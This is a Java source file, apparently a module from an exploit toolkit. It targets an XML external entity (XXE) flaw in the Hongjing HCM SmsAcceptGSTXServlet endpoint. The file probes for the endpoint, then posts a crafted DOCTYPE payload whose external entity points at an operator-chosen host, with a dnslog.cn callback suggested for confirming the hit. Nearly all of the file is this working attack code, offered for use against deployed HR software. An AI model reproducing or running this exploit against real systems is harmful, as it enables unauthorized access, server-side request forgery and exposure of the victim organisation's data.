package exp.oa.hongjingoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.HashMap;

public class hongjing_hcm_SmsAcceptGSTXServlet_xxe implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea) {
        try{
            Response response = HttpTools.get(url + "/servlet/sms/SmsAcceptGSTXServlet", new HashMap<String, String>(), "utf-8");

            if (response.getCode() ==200 ) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ hongjing_hcm_SmsAcceptGSTXServlet_xxe ]");
                    textArea.appendText("\n 存在SmsAcceptGSTXServlet接口");
                });
                Platform.runLater(() -> {
                    textArea.appendText("\n 该漏洞目前适用于dnslog检测: http://dnslog.cn");
                });
                return true;
            } else {
                Platform.runLater(() -> textArea.appendText("\n"));

                return false;
            }
        }catch (Exception e){
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {
        try{
            if(!cmd.contains("http://")){
                cmd = "http://"+cmd;
            }
            String finalCmd = cmd;
            StringBuilder xml = new StringBuilder();
            xml.append("<?xml version=\"1.0\" encoding=\"utf-8\"?>\n");
            xml.append("<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM \""+cmd+"\">]>");
            xml.append("<r><a>&sp;</a ></r>");

            HashMap<String, String> head = new HashMap<>();
            head.put("Content-Type", "application/xml");
            Response post_res = HttpTools.post(url+"/servlet/sms/SmsAcceptGSTXServlet",xml.toString(),head,"utf-8");
            if (post_res.getText() != null && post_res.getCode()==200) {
                Platform.runLater(() -> {
                    textArea.appendText("\n 执行成功,请自行判断");
                    textArea_cmd.appendText("\n"+ finalCmd);
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n 执行失败！");
                });
                return false;
            }
        }catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });

        }
        return false;
    }
}
